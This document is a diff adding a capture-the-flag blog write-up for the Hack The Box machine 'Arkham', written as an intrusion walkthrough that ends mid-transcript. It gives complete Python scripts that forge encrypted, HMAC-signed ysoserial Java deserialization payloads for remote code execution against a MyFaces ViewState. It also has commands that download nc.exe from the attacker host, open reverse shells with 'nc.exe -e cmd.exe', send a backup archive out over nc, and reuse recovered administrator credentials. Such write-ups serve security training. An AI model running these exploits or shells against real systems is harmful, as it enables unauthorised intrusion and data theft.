@@ -1,0 +1,710 @@
+---
+layout: default
+title: Arkham
+---
+
+<h1>Arkham</h1>
+<p class="date">10/08/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/arkham/arkham.png">
+
+<p>Arkham is a pretty difficult box for being ranked as medium. The toughest part is achieving access to the system via a Java deserialization vulnerability where the vulnerable object should be encrypted to make it work. Then, escalate privileges is quite easy, just find another user's password who is allowed to access the entire filesystem.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First run <code>nmap</code> to see we have an <code>IIS</code> on port <code>80</code>, an <code>Apache</code> in port <code>8080</code> and <code>SMB</code> enabled.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# nmap -sC -sV 10.10.10.130
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-20 14:50 EDT
+Nmap scan report for 10.10.10.130
+Host is up (0.068s latency).
+Not shown: 995 filtered ports
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+8080/tcp open  http          Apache Tomcat 8.5.37
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-title: Mask Inc.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-05-20 14:51:12
+|_  start_date: N/A
+</pre>
+
+<p>If we list the available shares with <code>smbclient</code> we can see the following ones.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# smbclient -L //10.10.10.130
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	BatShare        Disk      Master Wayne's secrets
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	Users           Disk      
+</pre>
+
+<p>We have read permissions on <code>BatShare</code> and in this share we only have one file <code>appserver.zip</code>, let's download it to see what's in there.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# smbclient //10.10.10.130/BatShare
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Feb  3 08:00:10 2019
+  ..                                  D        0  Sun Feb  3 08:00:10 2019
+  appserver.zip                       A  4046695  Fri Feb  1 01:13:37 2019
+
+		5158399 blocks of size 4096. 2120122 blocks available
+smb: \> get appserver.zip
+getting file \appserver.zip of size 4046695 as appserver.zip (490.0 KiloBytes/sec) (average 490.0 KiloBytes/sec)
+</pre>
+
+<p>Unzip it to find two files.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# unzip appserver.zip 
+Archive:  appserver.zip
+  inflating: IMPORTANT.txt           
+  inflating: backup.img  
+</pre>
+
+<p>The <code>txt</code> has the following message.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# cat IMPORTANT.txt 
+Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce
+</pre>
+
+<p>And the other file is a <code>LUKS</code> encrypted image, which means we'll need a password to see what's inside.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# file backup.img 
+backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
+</pre>
+
+<p>We're going to brute force the password, but throwing the entire <code>rockyou.txt</code> would take too much, so we can create a subset of it with only the passwords which contain <code>batman</code>, as the box name is batman's city.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# grep batman /usr/share/wordlists/rockyou.txt > batman_rocks.txt
+</pre>
+
+<p>Then run <code>hashcat</code> and eventually it will find the correct password is <code>batmanforever</code>.</p> 
+
+<pre class="prettyprint">
+# hashcat -m 14600 -a 0 backup.img /usr/share/wordlists/rockyou.txt
+batmanforever
+</pre>
+
+<p>Now, having the password we can mount the image.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# cryptsetup luksOpen backup.img backup
+Enter passphrase for backup.img: batmanforever
+</pre>
+
+<p>Confirm the image is mapped correctly.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# cryptsetup -v status backup
+/dev/mapper/backup is active and is in use.
+  type:    LUKS1
+  cipher:  aes-xts-plain64
+  keysize: 256 bits
+  key location: dm-crypt
+  device:  /dev/loop0
+  loop:    /root/htb/arkham/backup.img
+  sector size:  512
+  offset:  4096 sectors
+  size:    22528 sectors
+  mode:    read/write
+Command successful.
+</pre>
+
+<p>Here we have the script of the film <i>Batman Begins</i>, a couple of pictures and some <code>Tomcat</code> configuration files.</p>
+
+<pre class="prettyprint long">
+root@kali:/media/root/af474e94-894e-4bb6-897a-adc82884b3d8# ls -laR
+.:
+total 18
+drwxr-xr-x  4 root root  1024 Dec 25 01:00 .
+drwxr-x---+ 3 root root  4096 May 25 06:16 ..
+drwx------  2 root root 12288 Dec 25 00:59 lost+found
+drwxrwxr-x  4 root root  1024 Dec 25 00:23 Mask
+
+./lost+found:
+total 13
+drwx------ 2 root root 12288 Dec 25 00:59 .
+drwxr-xr-x 4 root root  1024 Dec 25 01:00 ..
+
+./Mask:
+total 882
+drwxrwxr-x 4 root root   1024 Dec 25 00:23 .
+drwxr-xr-x 4 root root   1024 Dec 25 01:00 ..
+drwxr-xr-x 2 root root   1024 Dec 25 00:22 docs
+-rw-rw-r-- 1 root root  96978 Dec 25 00:18 joker.png
+-rw-rw-r-- 1 root root 105374 Dec 25 00:20 me.jpg
+-rw-rw-r-- 1 root root 687160 Dec 25 00:20 mycar.jpg
+-rw-rw-r-- 1 root root   7586 Dec 25 00:19 robin.jpeg
+drwxr-xr-x 2 root root   1024 Dec 25 00:24 tomcat-stuff
+
+./Mask/docs:
+total 198
+drwxr-xr-x 2 root root   1024 Dec 25 00:22 .
+drwxrwxr-x 4 root root   1024 Dec 25 00:23 ..
+-rw-r--r-- 1 root root 199998 Jun 15  2017 Batman-Begins.pdf
+
+./Mask/tomcat-stuff:
+total 193
+drwxr-xr-x 2 root root   1024 Dec 25 00:24 .
+drwxrwxr-x 4 root root   1024 Dec 25 00:23 ..
+-rw-r--r-- 1 root root   1368 Dec 25 00:23 context.xml
+-rw-r--r-- 1 root root    832 Dec 25 00:24 faces-config.xml
+-rw-r--r-- 1 root root   1172 Dec 25 00:23 jaspic-providers.xml
+-rw-r--r-- 1 root root     39 Dec 25 00:24 MANIFEST.MF
+-rw-r--r-- 1 root root   7678 Dec 25 00:23 server.xml
+-rw-r--r-- 1 root root   2208 Dec 25 00:23 tomcat-users.xml
+-rw-r--r-- 1 root root 174021 Dec 25 00:23 web.xml
+-rw-r--r-- 1 root root   3498 Dec 25 00:24 web.xml.bak
+</pre>
+
+<p>What is interesting here is the following configuration in <code>web.xml.bak</code> which we'll need later.</p>
+
+<pre class="prettyprint">
+root@kali:/media/root/af474e94-894e-4bb6-897a-adc82884b3d8/Mask/tomcat-stuff# cat web.xml.bak
+...
+&lt;context-param>
+&lt;description>State saving method: 'client' or 'server' (=default). See JSF Specification 2.5.2&lt;/description>
+&lt;param-name>javax.faces.STATE_SAVING_METHOD&lt;/param-name>
+&lt;param-value>server&lt;/param-value>
+&lt;/context-param>
+&lt;context-param>
+&lt;param-name>org.apache.myfaces.SECRET&lt;/param-name>
+&lt;param-value>SnNGOTg3Ni0=&lt;/param-value>
+&lt;/context-param>
+    &lt;context-param>
+        &lt;param-name>org.apache.myfaces.MAC_ALGORITHM&lt;/param-name>
+        &lt;param-value>HmacSHA1&lt;/param-value>
+     &lt;/context-param>
+&lt;context-param>
+&lt;param-name>org.apache.myfaces.MAC_SECRET&lt;/param-name>
+&lt;param-value>SnNGOTg3Ni0=&lt;/param-value>
+&lt;/context-param>
+...
+</pre>
+
+<p>Having this, now we can move forward to another service.</p>
+
+<p>In port <code>80</code> we had an <code>IIS</code> running and if we get inside, we should see there's only the default picture, so nothing interesting.</p>
+
+<img class="img-fluid" src="/static/img/htb/arkham/1.png">
+
+<p>On the other hand, on the <code>Tomcat</code> server on port <code>8080</code> we seem to have a configured website.</p>
+
+<img class="img-fluid" src="/static/img/htb/arkham/2.png">
+
+<p>If we click on the Subscription link on the top we'll get redirected to <code>/userSubscribe.faces</code> where there's the following form.</p>
+
+<img class="img-fluid" src="/static/img/htb/arkham/3.png">
+
+<p>On the form there's this hidden input field.</p>
+
+<pre class="prettyprint">
+&lt;input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1Rd1x5LURafml70KtDtngjDm0mNzA9qHjYerxo0jW7zu1Qxb78J8MRRgV/oWNsOb5owxiays=" />
+</pre>
+
+<p>This <code>ViewState</code> attribute is a mechanism that <code>MyFaces</code> uses to to store the current state of the view. This state is a java serialized object, which means we'll probably have to make a java deserialization attack.</p>
+
+<p>On the <a href="https://myfaces.apache.org/core20/myfaces-impl-shared/apidocs/org/apache/myfaces/shared/util/StateUtils.html" target="_blank">MyFaces documentation</a> there's all the information to learn how these objects are being encrypted, and therefore how should be decrypted.</p>
+
+<p>Assuming this server is using the configuration we found on the previous file and based on the default values described in the documentation, we know the following:</p>
+
+<ul>
+	<li><b>STATE_SAVING_METHOD:</b> server</li>
+	<li><b>SECRET:</b> SnNGOTg3Ni0=</li>
+	<li><b>MAC_ALGORITHM:</b> HmacSHA1</li>
+	<li><b>ENCRYPTION_ALGORITHM:</b> DES (default)</li>
+	<li><b>PADDING:</b> PKCS5 (default)</li>
+</ul>
+
+<p>Because the state is being stored on the server side, the value of the <code>ViewState</code> is a serialized java object which identifies a certain state.</p>
+
+<p>In our case, these are the steps we have to follow to decrypt the <code>ViewState</code>:</p>
+<ul>
+	<li>URL decode the <code>ViewState</code> value (because I grabbed it from burp).</li>
+	<li>Base64 decode the <code>ViewState</code> value.</li>
+	<li>Base64 decode the secret.</li>
+	<li>DES decrypt the decoded <code>ViewState</code> value with the decoded secret.</li>
+</ul>
+
+<p>I used the following <code>python</code> script to reproduce the decrypt steps.</p>
+
+<pre class="prettyprint">
+import urllib
+import sys
+import base64
+from Crypto.Cipher import DES
+
+secret = base64.b64decode("SnNGOTg3Ni0=")
+obj = DES.new(secret, DES.MODE_ECB)
+
+payload = sys.argv[1]
+payload = urllib.unquote(payload)
+payload = base64.b64decode(payload)
+payload += (8 - len(payload) % 8) * 'X' # must be a multiple of 8 in length
+payload = obj.decrypt(payload)
+print payload
+</pre>
+
+<p>Indeed, on the decrypted value we can see our <code>ViewState</code> is a java serialized object.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# python decrypt.py wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1Rd1x5LURafml70KtDtngjDm0mNzA9qHjYerxo0jW7zu1Qxb78J8MRRgV/oWNsOb5owxiays%3D
+��ur[Ljava.lang.Object;��X�s)lxpt6pt/userSubscribe.jsp��Z�ߴ�9�l�1�/�i���@�3�
+</pre>
+
+<p>Now what we have to do is create a malicious java serialized object to be able to execute commands on the system, replacing the <code>ViewState</code> value on the POST request. For this task I used <a href="https://github.com/frohoff/ysoserial" target="_blank"><code>ysoserial</code></a>.</p>
+
+<p><code>ysoserial</code> allows us to create java serialized objects selecting a payload type and the command we want to execute.</p>
+
+<pre class="prettyprint">
+root@kali:/opt# java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 "ping 10.10.16.15" | base64 -w 0
+rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAD3BpbmcgMTAuMTAuMTYuM3QABGV4ZWN1cQB+AB4AAAABcQB+ACNzcQB+ABFzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgA6
+</pre>
+
+<p>Unfortunately, if we send directly this value it won't work, because it has to be encrypted as we saw before.</p>
+
+<p>These are the steps we have to follow to encrypt and sign our payload to make it work correctly in our case.</p>
+
+<ul>
+	<li>Base64 decode the secret.</li>
+	<li>Create the <code>ysoserial</code> payload.</li>
+	<li>Encrypt the payload with the decoded secret using <code>DES</code> and <code>PKCS5</code> padding.</li>
+	<li>Create a <code>HmacSHA1</code> signature of the encrypted value and the secret.</li>
+	<li>Append the signature to the encrypted payload.</li>
+	<li>Base64 encode the payload.</li>
+	<li>URL encode the payload.</li>
+	<li>Send.</li>
+</ul>
+
+<p>Because I didn't know which payload type would work I tried all of them to see which one was accepted.</p>
+
+<p>To automate the process I made the following <code>python</code> script where I make a payload that should run a <code>ping</code> against my machine.</p>
+
+<pre class="prettyprint">
+import urllib
+import base64
+import subprocess
+import requests
+import hashlib
+import pyDes
+import hmac
+
+url = "http://10.10.10.130:8080/userSubscribe.faces"
+r = requests.get(url)
+cookie = r.headers['set-cookie']
+
+secret = base64.b64decode("SnNGOTg3Ni0=")
+cipher = pyDes.des(secret, pad=None, padmode=pyDes.PAD_PKCS5)
+
+types = ["BeanShell1", "C3P0", "Clojure", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6", "FileUpload1", "Groovy1", "Hibernate1", "Hibernate2", "JBossInterceptors1", "JRMPClient", "JRMPListener", "JSON1", "JavassistWeld1", "Jdk7u21", "Jython1", "MozillaRhino1", "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2", "URLDNS", "Wicket1"]
+for type in types:
+	try:
+		cmd = 'ping 10.10.16.50'
+		ysoserial = 'java -jar /opt/ysoserial-master-SNAPSHOT.jar ' + type + ' "' + cmd + '"'
+		payload = subprocess.check_output(ysoserial, shell=True)
+		payload = cipher.encrypt(payload)
+		hmacSignature = hmac.new(secret, payload, hashlib.sha1).digest()
+		payload = base64.b64encode(payload + hmacSignature)
+		payload = urllib.quote(payload)
+
+		headers = {"Cookie": cookie, "Content-Type": "application/x-www-form-urlencoded"}
+		data = "j_id_jsp_1623871077_1%3Aemail=caca&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState=" + payload
+		r = requests.post(url, data=data, headers=headers)
+	except:
+		continue
+</pre>
+
+<p>Using <code>tcpdump</code> while the script runs we can see a couple of pings are sent, which means we have RCE!</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+16:04:28.266833 IP 10.10.10.130 > kali: ICMP echo request, id 1, seq 27, length 40
+16:04:28.266872 IP kali > 10.10.10.130: ICMP echo reply, id 1, seq 27, length 40
+16:04:28.931960 IP 10.10.10.130 > kali: ICMP echo request, id 1, seq 28, length 40
+16:04:28.932034 IP kali > 10.10.10.130: ICMP echo reply, id 1, seq 28, length 40
+16:04:29.390201 IP 10.10.10.130 > kali: ICMP echo request, id 1, seq 29, length 40
+16:04:29.390222 IP kali > 10.10.10.130: ICMP echo reply, id 1, seq 29, length 40
+16:04:29.932976 IP 10.10.10.130 > kali: ICMP echo request, id 1, seq 30, length 40
+</pre>
+
+<p>To see which payload types work, we can modify the command to execute a <code>curl</code> using as the path the payload type name, like this.</p> 
+
+<pre class="prettyprint">
+import urllib
+import base64
+import subprocess
+import requests
+import hashlib
+import pyDes
+import hmac
+
+url = "http://10.10.10.130:8080/userSubscribe.faces"
+r = requests.get(url)
+cookie = r.headers['set-cookie']
+
+secret = base64.b64decode("SnNGOTg3Ni0=")
+cipher = pyDes.des(secret, pad=None, padmode=pyDes.PAD_PKCS5)
+
+types = ["BeanShell1", "C3P0", "Clojure", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6", "FileUpload1", "Groovy1", "Hibernate1", "Hibernate2", "JBossInterceptors1", "JRMPClient", "JRMPListener", "JSON1", "JavassistWeld1", "Jdk7u21", "Jython1", "MozillaRhino1", "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2", "URLDNS", "Wicket1"]
+for type in types:
+	try:
+		cmd = 'curl http://10.10.16.50/' + type
+		ysoserial = 'java -jar /opt/ysoserial-master-SNAPSHOT.jar ' + type + ' "' + cmd + '"'
+		payload = subprocess.check_output(ysoserial, shell=True)
+		payload = cipher.encrypt(payload)
+		hmacSignature = hmac.new(secret, payload, hashlib.sha1).digest()
+		payload = base64.b64encode(payload + hmacSignature)
+		payload = urllib.quote(payload)
+
+		headers = {"Cookie": cookie, "Content-Type": "application/x-www-form-urlencoded"}
+		data = "j_id_jsp_1623871077_1%3Aemail=caca&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState=" + payload
+		r = requests.post(url, data=data, headers=headers)
+	except:
+		continue
+</pre>
+
+<p>And using <code>SimpleHTTPServer</code> module, we can see only <code>CommonsCollections5</code> and <code>CommonsCollections6</code> worked.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.130 - - [26/May/2019 17:41:14] code 404, message File not found
+10.10.10.130 - - [26/May/2019 17:41:14] "GET /CommonsCollections5 HTTP/1.1" 404 -
+10.10.10.130 - - [26/May/2019 17:41:14] code 404, message File not found
+10.10.10.130 - - [26/May/2019 17:41:14] "GET /CommonsCollections6 HTTP/1.1" 404 -
+10.10.10.130 - - [26/May/2019 17:48:34] code 404, message File not found
+</pre>
+
+<p>Now, change the script a bit to execute the command we want and only use <code>CommonsCollections6</code> payload type, which we know works.</p>
+
+<pre class="prettyprint">
+import urllib
+import base64
+import subprocess
+import requests
+import hashlib
+import pyDes
+import hmac
+import sys
+
+url = "http://10.10.10.130:8080/userSubscribe.faces"
+r = requests.get(url)
+cookie = r.headers['set-cookie']
+
+cmd = sys.argv[1]
+
+secret = base64.b64decode("SnNGOTg3Ni0=")
+cipher = pyDes.des(secret, pad=None, padmode=pyDes.PAD_PKCS5)
+
+ysoserial = 'java -jar /opt/ysoserial-master-SNAPSHOT.jar CommonsCollections6 "' + cmd + '"'
+payload = subprocess.check_output(ysoserial, shell=True)
+payload = cipher.encrypt(payload)
+hmacSignature = hmac.new(secret, payload, hashlib.sha1).digest()
+payload = base64.b64encode(payload + hmacSignature)
+payload = urllib.quote(payload)
+
+headers = {"Cookie": cookie, "Content-Type": "application/x-www-form-urlencoded"}
+data = "j_id_jsp_1623871077_1%3Aemail=caca&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState=" + payload
+r = requests.post(url, data=data, headers=headers)
+</pre>
+
+<p>Then, to get a shell on the system I downloaded <code>nc</code> from my machine and used it to execute a reverse shell.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# python rce.py "curl http://10.10.16.45/nc.exe -o ."
+root@kali:~/htb/arkham# python rce.py "nc.exe 10.10.16.45 6969 -e cmd.exe"
+</pre>
+
+<p>And we should get a shell as <code>alfred</code> if we were listening on the specified port.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# nc -nlvp 6969
+listening on [any] 6969 ...
+connect to [10.10.16.45] from (UNKNOWN) [10.10.10.130] 49991
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\tomcat\apache-tomcat-8.5.37\bin>whoami
+whoami
+arkham\alfred
+</pre>
+
+<p>We have the user flag on Alfred's desktop.</p>
+
+<pre class="prettyprint">
+C:\Users\Alfred\Desktop>type user.txt
+type user.txt
+<span flag="ba659321c89c48a3dcb915bc46d58071">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>On Alfred downloads we have a backups folder with a <code>zip</code> file.</p>
+
+<pre class="prettyprint">
+C:\Users\Alfred\Downloads\backups>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FA90-3873
+
+ Directory of C:\Users\Alfred\Downloads\backups
+
+02/03/2019  08:41 AM    &lt;DIR>          .
+02/03/2019  08:41 AM    &lt;DIR>          ..
+02/03/2019  08:41 AM           124,257 backup.zip
+               1 File(s)        124,257 bytes
+               2 Dir(s)   7,414,816,768 bytes free
+</pre>
+
+<p>Using <code>nc</code> we can send this file to our machine to unzip it and see what's inside.</p>
+
+<pre class="prettyprint">
+C:\Users\Alfred\Downloads\backups>C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.16.45 6868 < backup.zip
+C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.16.45 6868 < backup.zip
+</pre>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# nc -nlvp 6868 > backup.zip
+listening on [any] 6868 ...
+connect to [10.10.16.45] from (UNKNOWN) [10.10.10.130] 50024
+</pre>
+
+<p>There we have an <code>.ost</code> file.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# unzip backup.zip 
+Archive:  backup.zip
+  inflating: alfred@arkham.local.ost 
+</pre>
+
+<p>Which is an Outlook email folder.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# file alfred@arkham.local.ost 
+alfred@arkham.local.ost: Microsoft Outlook email folder
+</pre>
+
+<p>We can retrieve the emails using <code>readpst</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# readpst alfred@arkham.local.ost 
+Opening PST file and indexes...
+Processing Folder "Deleted Items"
+Processing Folder "Inbox"
+Processing Folder "Outbox"
+Processing Folder "Sent Items"
+Processing Folder "Calendar"
+Processing Folder "Contacts"
+	"Inbox" - 0 items done, 7 items skipped.
+Processing Folder "Conversation Action Settings"
+Processing Folder "Drafts"
+Processing Folder "Journal"
+Processing Folder "Junk E-Mail"
+Processing Folder "Notes"
+Processing Folder "Tasks"
+Processing Folder "Sync Issues"
+Processing Folder "RSS Feeds"
+Processing Folder "Quick Step Settings"
+	"alfred@arkham.local.ost" - 15 items done, 0 items skipped.
+	"Calendar" - 0 items done, 3 items skipped.
+Processing Folder "Conflicts"
+Processing Folder "Local Failures"
+Processing Folder "Server Failures"
+	"Sync Issues" - 3 items done, 0 items skipped.
+	"Drafts" - 1 items done, 0 items skipped.
+</pre>
+
+<p>On the Drafts folder we have the following mail with an attached picture.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# cat Drafts.mbox 
+From "MAILER-DAEMON" Thu Jan 1 00:00:00 1970
+From: &lt;MAILER-DAEMON>
+Subject: 
+To: batman
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="--boundary-LibPST-iamunique-897628897_-_-"
+...
+&lt;/o:shapelayout>&lt;/xml>&lt;![endif]-->&lt;/head>&lt;body lang=EN-US link="#0563C1" vlink="#954F72" style='tab-interval:.5in'>&lt;div class=WordSection1>&lt;p class=MsoNormal>Master Wayne stop forgetting your password&lt;o:p>&lt;/o:p>&lt;/p>&lt;p class=MsoNormal>&lt;o:p>&nbsp;&lt;/o:p>&lt;/p>&lt;p class=MsoNormal>&lt;span style='mso-no-proof:yes'>&lt;img width=677 height=343 id="Picture_x0020_1" src="cid:image001.png@01D4BB4A.F5061EA0">&lt;/span>&lt;o:p>&lt;/o:p>&lt;/p>&lt;/div>&lt;/body>&lt;/html>
+----boundary-LibPST-iamunique-897628897_-_-
+Content-Type: image/png
+Content-Transfer-Encoding: base64
+Content-ID: &lt;image001.png@01D4BB4A.F5061EA0>
+Content-Disposition: attachment; 
+        filename*=utf-8''image001.png;
+        filename="image001.png"
+
+iVBORw0KGgoAAAANSUhEUgAAAqUAAAFXCAIAAAAUCKDqAAAAAXNSR0IArs4c6QAAJwVJREFUeF7t
+3V+oZdd5GPCjUmibujISRUNh5GhiCya2hI0lVXSoEwXXCRMoqpUXyzR6MFaUIlwh2S9+kB+sB7/Y
+ElNjWskmDzJ0/FKpItCBGDGSBROGKMYgoaqM3XEsQZBpLazUTelLu8/Z9+677/679jn7O3edO7/L
+IEbn7v2tb/2+dfa3/5w797qPfuyOhS8CBAgQIEDgWAtcV/T7u7994VjP0eQIECBAYIcF/vKPz97x
+...
+</pre>
+
+<p>Decode the base64 value to get the image.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# echo iVBORw0KGgoAAAANSUhEUgAAAqUAAAFXCAIA... | base64 -d > image001.png
+</pre>
+
+<p>In the picture we have Batman's password (<code>Zx^#QZX+T!123</code>).</p>
+
+<img class="img-fluid" src="/static/img/htb/arkham/image001.png">
+
+<p>And checking batman's information we can see he's part of the Administrators local group.</p>
+
+<pre class="prettyprint">
+C:\Users>net user batman
+net user batman
+User name                    Batman
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          001 (United States)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/3/2019 9:25:50 AM
+Password expires             Never
+Password changeable          2/3/2019 9:25:50 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   5/28/2019 1:52:48 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *Users                
+Global Group memberships     *None                 
+</pre>
+
+<p>Change to a PowerShell shell.</p>
+
+<pre class="prettyprint">
+C:\Users>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users>
+</pre>
+
+<p>And execute <code>nc</code> as batman to create another reverse shell.</p>
+
+<pre class="prettyprint">
+PS C:\Users> $password = "Zx^#QZX+T!123" | ConvertTo-SecureString -AsPlainText -Force
+PS C:\Users> $cred = New-Object System.Management.Automation.PSCredential -ArgumentList "Batman",$password
+PS C:\Users> Invoke-Command -ScriptBlock {C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.16.45 6767 -e cmd.exe} -Credential $cred -computername localhost
+</pre>
+
+<p>We get a new shell as batman.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/arkham# nc -nlvp 6767
